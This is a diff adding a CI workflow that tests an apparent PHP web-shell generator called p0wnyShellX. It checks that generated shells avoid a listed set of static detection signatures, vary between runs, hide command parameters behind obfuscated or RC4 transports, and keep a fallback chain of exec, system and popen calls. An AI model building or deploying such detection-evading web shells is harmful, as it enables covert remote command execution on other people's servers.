@@ -1,0 +1,139 @@
+name: CI
+
+on:
+  push:
+    branches: ['**']
+  pull_request:
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Set up Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: '3.11'
+
+      - name: Set up PHP
+        uses: shivammathur/setup-php@v2
+        with:
+          php-version: '8.3'
+
+      - name: Generate shells (all themes + option combinations)
+        run: |
+          python3 p0wnyShellX.py -p "CITestPass42!" -o /tmp/s1.php
+          python3 p0wnyShellX.py -p "CITestPass42!" -t matrix -j 5 -o /tmp/s2.php
+          python3 p0wnyShellX.py -p "CITestPass42!" -t corporate-blue --no-junk -o /tmp/s3.php
+          python3 p0wnyShellX.py -p "CITestPass42!" -t infra-dark -j 80 -u operator -o /tmp/s4.php
+          python3 p0wnyShellX.py -p "CITestPass42!" --seed 1337 -o /tmp/s5.php
+          python3 p0wnyShellX.py -p "CITestPass42!" --transport mimic -o /tmp/s6.php
+          python3 p0wnyShellX.py -p "CITestPass42!" --transport rc4   -o /tmp/s7.php
+
+      - name: PHP syntax check
+        run: |
+          for f in /tmp/s1.php /tmp/s2.php /tmp/s3.php /tmp/s4.php /tmp/s5.php /tmp/s6.php /tmp/s7.php; do
+            php -l "$f" || exit 1
+          done
+
+      - name: Check no static signatures present
+        run: |
+          SIGNATURES=(
+            "fetchContentBlock"
+            "_resolveTask"
+            "SESSION_ACTIVE"
+            "feature=shell"
+            "pipeCall-cmd"
+            "panel-stream"
+            "getPassword"
+            "suggestEntry"
+            "featurePwd"
+          )
+          for f in /tmp/s1.php /tmp/s2.php /tmp/s3.php /tmp/s4.php /tmp/s5.php /tmp/s6.php /tmp/s7.php; do
+            for sig in "${SIGNATURES[@]}"; do
+              if grep -q "$sig" "$f"; then
+                echo "FAIL: static signature '$sig' found in $f"
+                exit 1
+              fi
+            done
+          done
+          echo "All static signature checks passed."
+
+      - name: Verify polymorphism (two runs must differ)
+        run: |
+          python3 p0wnyShellX.py -p "CITestPass42!" -o /tmp/poly_a.php 2>/dev/null
+          python3 p0wnyShellX.py -p "CITestPass42!" -o /tmp/poly_b.php 2>/dev/null
+          if diff -q /tmp/poly_a.php /tmp/poly_b.php > /dev/null 2>&1; then
+            echo "FAIL: two consecutive runs produced identical output."
+            exit 1
+          fi
+          echo "Polymorphism verified."
+
+      - name: Verify seed reproducibility (same seed must produce same output)
+        run: |
+          python3 p0wnyShellX.py -p "CITestPass42!" --seed 9999 -o /tmp/seed_a.php 2>/dev/null
+          python3 p0wnyShellX.py -p "CITestPass42!" --seed 9999 -o /tmp/seed_b.php 2>/dev/null
+          diff /tmp/seed_a.php /tmp/seed_b.php || (echo "FAIL: same seed produced different output." && exit 1)
+          echo "Seed reproducibility verified."
+
+      - name: Verify exec fallback chain integrity
+        run: |
+          for f in /tmp/s1.php /tmp/s2.php /tmp/s3.php /tmp/s4.php /tmp/s5.php; do
+            # Core methods must always be present
+            for method in exec shell_exec; do
+              if ! grep -q "function_exists('${method}')" "$f"; then
+                echo "FAIL: core method '${method}' missing in $f"
+                exit 1
+              fi
+            done
+            if ! grep -q "'system'" "$f"; then
+              echo "FAIL: core method 'system' missing in $f"
+              exit 1
+            fi
+            # At least one optional method must survive
+            found=0
+            for method in passthru popen proc_open; do
+              grep -q "'${method}'" "$f" && found=1
+            done
+            if [ $found -eq 0 ]; then
+              echo "FAIL: no optional exec method present in $f"
+              exit 1
+            fi
+          done
+          echo "Exec fallback chain integrity verified."
+
+      - name: Verify mimic transport (param names must not be cmd/cwd)
+        run: |
+          for param in cmd cwd filename type path file; do
+            if grep -q "POST\['${param}'\]" /tmp/s6.php; then
+              echo "FAIL: plain param name '${param}' found in mimic shell"
+              exit 1
+            fi
+          done
+          echo "Mimic transport: no plain param names found."
+
+      - name: Verify rc4 transport (tEnc/tDec must be present, no plain params)
+        run: |
+          if ! grep -q "function tEnc" /tmp/s7.php; then
+            echo "FAIL: tEnc not found in rc4 shell"
+            exit 1
+          fi
+          for param in cmd cwd filename type path file; do
+            if grep -q "POST\['${param}'\]" /tmp/s7.php; then
+              echo "FAIL: plain param name '${param}' found in rc4 shell"
+              exit 1
+            fi
+          done
+          echo "RC4 transport: tEnc present, no plain param names."
+
+      - name: Verify bcrypt hash is present and valid
+        run: |
+          php -r "
+            \$f = file_get_contents('/tmp/s1.php');
+            preg_match('/define\(.*?,\s*\'(\\\$2y\\\$[^\']+)\'\)/m', \$f, \$m);
+            if (empty(\$m[1])) { echo 'FAIL: bcrypt hash not found\n'; exit(1); }
+            if (!password_verify('CITestPass42!', \$m[1])) { echo 'FAIL: password_verify returned false\n'; exit(1); }
+            echo 'Bcrypt verification passed.\n';
+          "
